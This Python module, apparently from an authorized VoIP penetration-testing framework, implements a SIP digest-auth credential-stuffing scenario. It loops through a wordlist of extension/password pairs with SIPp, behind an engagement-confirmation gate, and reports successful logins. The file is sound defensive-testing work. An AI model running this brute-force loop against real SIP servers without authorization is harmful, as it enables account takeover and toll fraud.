"""
scenarios/digest_bruteforce.py

Credential stuffing against SIP digest auth: the single most common
real-world VoIP attack, and a different Kamailio defense than
pike/htable - auth-failure-specific throttling (e.g. pike tuned on
401/403 responses, or fail2ban-style external blocking on auth
failures) rather than raw request-rate limiting. Not redundant with
register_flood even though both are REGISTER-shaped: a pure volume
flood and a low-and-slow credential-stuffing run can trip completely
different thresholds - "low-and-slow" is also, deliberately, what this
scenario actually does: unlike every other scenario here, it drives
one real SIPp subprocess invocation *per credential pair* rather than
one invocation handling many calls.

That's not a shortcut, it's a real SIPp constraint discovered by
testing against a real mock target: SIPp's [authentication] keyword
takes its credentials from the -au/-ap/-s command-line flags for the
whole process, not from per-call substitution.
[authentication username=[field0] password=[field1]] looks like valid
syntax and SIPp's parser doesn't reject it outright, but it silently
corrupts the Authorization header instead of erroring - confirmed by
inspecting the raw bytes on the wire, not assumed. See
digest_bruteforce.xml's docstring and CHANGELOG.md for the same class
of "only shows up against a real sipp process" lesson already
documented twice before this.

Each credential pair is 2 real REGISTER requests (unauthenticated
challenge + authenticated retry), which is why this scenario's rate-
budget check below uses rate*2, not rate - the hard safety ceiling in
authorization.yml's max_total_requests has to bound real wire request
volume, not the number of credential pairs attempted.

Tier: active - requires --confirm <engagement_id>.
"""

from __future__ import annotations

import csv
import time
from pathlib import Path

from ..core.engagement import EngagementRefused
from ..core.sipp_runner import SippResult, run_sipp
from .base import SIPP_XML_DIR, BaseScenario, ScenarioResult

DEFAULT_WORDLIST = Path(__file__).parent.parent / "templates" / "digest_wordlist_default.csv"


def _load_wordlist(path: Path) -> list[tuple[str, str]]:
    with open(path, newline="") as f:
        return [(row[0].strip(), row[1].strip()) for row in csv.reader(f) if row and row[0].strip()]


def _call_succeeded(sipp_result: SippResult) -> bool:
    """True if this single-call sipp invocation's stats.csv reports
    that one call as successful (matched the mandatory 200 recv in
    digest_bruteforce.xml) rather than failed/timed out.

    Deliberately reads the *cumulative* column, not the periodic one:
    confirmed by inspecting a real stats.csv that SuccessfulCall(P) (the
    count in the most recent periodic sampling interval) can read 0 on
    the final row purely because of when that interval happened to
    close relative to the single call completing, even though the call
    genuinely succeeded - SuccessfulCall(C) (cumulative across the
    whole, single-call run) is the unambiguous answer here."""
    if not sipp_result.stats_csv.exists():
        return False
    with open(sipp_result.stats_csv) as f:
        rows = list(csv.DictReader(f, delimiter=";"))
    if not rows:
        return False
    last = rows[-1]
    successful = last.get("SuccessfulCall(C)") or last.get("SuccessfulCall") or "0"
    return successful.strip() not in ("", "0")


class DigestBruteforce(BaseScenario):
    name = "digest_bruteforce"
    tier = "active"
    description = (
        "Credential stuffing against SIP digest auth - one real REGISTER/401/"
        "REGISTER-with-digest cycle per extension/password pair in a wordlist. "
        "Validates auth-failure throttling, a different defense than pike/"
        "htable's raw request-rate limiting."
    )
    xml_file = "digest_bruteforce.xml"

    def run(
        self,
        target: str,
        port: int = 5060,
        rate: int = 2,
        duration: int = 5,
        transport: str = "udp",
        confirm: str | None = None,
        results_root: Path | None = None,
        wordlist: str | None = None,
        **kwargs,
    ) -> ScenarioResult:
        wordlist_path = Path(wordlist) if wordlist else DEFAULT_WORDLIST
        if not wordlist_path.exists():
            return ScenarioResult(
                scenario=self.name, target=target, allowed=False,
                refusal_reason=f"wordlist not found: {wordlist_path}",
            )

        pairs = _load_wordlist(wordlist_path)
        if not pairs:
            return ScenarioResult(
                scenario=self.name, target=target, allowed=False,
                refusal_reason=f"wordlist is empty: {wordlist_path}",
            )

        credential_pairs = rate * duration

        try:
            # Each credential pair is 2 real REGISTER requests (challenge
            # + authenticated retry) - the rate budget must bound actual
            # wire volume, not the number of credential pairs. See
            # module docstring.
            self.engagement.gate(
                action=f"scenario:{self.name}",
                target=target,
                tier=self.tier,
                confirm_engagement_id=confirm,
                rate=rate * 2,
                duration=duration,
            )
        except EngagementRefused as e:
            return ScenarioResult(
                scenario=self.name, target=target, allowed=False, refusal_reason=str(e)
            )

        results_dir = (results_root or Path("results")) / self.name / target.replace(":", "_")
        scenario_xml = SIPP_XML_DIR / self.xml_file

        successes = 0
        failures = 0
        last_result: SippResult | None = None
        for i in range(credential_pairs):
            extension, password = pairs[i % len(pairs)]
            attempt_dir = results_dir / f"attempt_{i}_{extension}"
            sipp_result = run_sipp(
                target=target, port=port, scenario_file=scenario_xml,
                rate=1, total_calls=1, transport=transport, results_dir=attempt_dir,
                extra_args=["-s", extension, "-au", extension, "-ap", password],
            )
            last_result = sipp_result
            if _call_succeeded(sipp_result):
                successes += 1
            else:
                failures += 1
            if rate > 0 and i < credential_pairs - 1:
                time.sleep(1 / rate)

        return ScenarioResult(
            scenario=self.name, target=target, allowed=True,
            sipp_result=last_result,
            summary={
                "credential_pairs_attempted": credential_pairs,
                "requests_sent_estimate": credential_pairs * 2,
                "successful_logins": successes,
                "failed_attempts": failures,
                "wordlist": str(wordlist_path),
            },
        )
